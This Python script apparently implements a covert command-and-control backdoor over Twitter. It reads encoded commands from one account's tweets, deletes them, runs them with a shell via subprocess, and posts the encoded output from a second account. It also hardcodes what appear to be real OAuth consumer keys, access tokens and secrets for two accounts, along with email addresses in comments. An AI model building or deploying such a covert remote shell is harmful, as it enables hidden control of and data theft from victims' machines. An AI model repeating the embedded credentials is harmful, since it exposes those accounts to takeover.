import tweepy
from newEncrypt import *
import subprocess
import os
from time import sleep
import sys

#lbwbchigh@yahoo.com 
consumer_key = 'zLZ2NN1qemQChgVOae3QlgNtp'
consumer_secret = 'hbAZzMFdpff1sDHp50d4qt4l7QumyUfhxSybl5Smne1eTi2mEw'
access_token = '4827323871-Oig9GWZc6gkVUYK7oTkQO1O4dmoJLuCaY8vE6Dh'
access_token_secret = 'h2BMjDxt24XolArqy2vuRJYauMqKp2boNIgWUdHwlmGxD'
auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
auth.set_access_token(access_token, access_token_secret )
api = tweepy.API(auth)

#krazykatphoenix@yahoo.com
consumer_key = 'CEkMw02DlRrM7iFdsadhuAGWz'
consumer_secret = 'A3VVGro2sy2A0SSYLx3hD1Q4IFpa0lsobUKQ0HyAN5z6FZMf1X'
access_token = '701149655468527616-CznesGkPJEqyHGjtJTauqKPtUH9O2XJ'
access_token_secret = 'H4u8EiOe5THE8lPt51Oy4AxLyoleTpugEXIDqRbnRT5Ac'
auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
auth.set_access_token(access_token, access_token_secret )
apiTwo = tweepy.API(auth)



 



def limit():
	data = api.rate_limit_status()
	value = str(data['resources']['statuses']['/statuses/user_timeline'])
	if (len(value) == 55):
		almost = value[-3:]
		remain= almost[:2]
		real = (int(remain) -4)
		print str(real) + " API calls remaining" 
		if( int(remain) == 4):
			print "Sleeping for 15 minutes. Manually delete tweets from Twitter pages."
			sleep(15*61)
	else:
		almost = value[-4:]
		remain= almost[:3]
		real = (int(remain) -4)
		print str(real) + " API calls remaining" 
		if( int(remain) == 4):
			print "Sleeping for 15 minutes. Manually delete tweets from Twitter pages."
			sleep(15*61)	


def listen():
	
	public_tweets = None
	while(not public_tweets):
		public_tweets = api.user_timeline('PhoenixKrazyKat')
		limit()
		
		if public_tweets:
			for tweet in public_tweets:
				test = str(tweet.text)			
				api.destroy_status(tweet.id)
				bytes = str.encode(test)
				type(bytes)	
				mess = decode(bytes)
				 
				#work on cd command here
				if mess[:2] == "cd":
					try:
						os.chdir(mess[3:])
						print "Directory changed."
						result = "Directory Changed." 
						enResult = encode(result)
						apiTwo.update_status(enResult)
					except:
    							print("Unexpected error:", sys.exc_info()[0])
    							result = "Error. Invalid directory."
    							enResult = encode(result)
							apiTwo.update_status(enResult)
    							listen()
    							raise	
				else:
					try:
						response = subprocess.check_output(mess, shell=True)
					except:
    						print("Unexpected error:", sys.exc_info()[0])
    						result = "Error. Invalid command entered."
    						enResult = encode(result)
						apiTwo.update_status(enResult)
    						listen()
    						raise	
					if (len(response) >= 47):
						cutResp = response[:46] + '*'
						enResponse = encode(cutResp)
					else:
						newResp = response[:47]
						enResponse = encode(newResp)
				#if response != "" and repsonse != '/Users/Luke/Desktop/':
					#cutEnResponse = enResponse[:140]
					apiTwo.update_status(enResponse)
					print response
				#else:
					#api.update_status("Directory changed." ) 
					#os.chdir(test)	
				#sleep(5)
					break
				#sleep(3)
			#if count == 9:
				#print "Sleeping for 15 minutes..."
				
				#count = 0
				#sleep(61 * 15)
			#else:
				#new_public_tweets = api.home_timeline()
				#count = count +1
				#for tweet in new_public_tweets:	
					#sleep(5)		
					#api.destroy_status(tweet.id)						
				#if count == 9:
					#print "Sleeping for 15 minutes..."
					
					#count = 0
					#sleep(61 * 15)
				#else: 		
			listen()
		else: 
			print("No tweets!")
			sleep(5)


if __name__ == "__main__":
	try:	
		listen() 
		#limit()
	except:
    		print("Unexpected error:", sys.exc_info()[0])
    		result = "Error. Invalid command entered."
    		enResult = encode(result)
		apiTwo.update_status(enResult)
    		listen()
    		raise	
	
#new_tweets = api.search(q='PhoenixKrazyKat', count=10)
#print new_tweets


	
		#bytes = str.encode(test)
		#type(bytes)	
		#mess = decode(bytes)
		
		#enResponse = encode(response) 
	
	
	#count = count + 1

	
	#print "Decoded message: " + mess
	#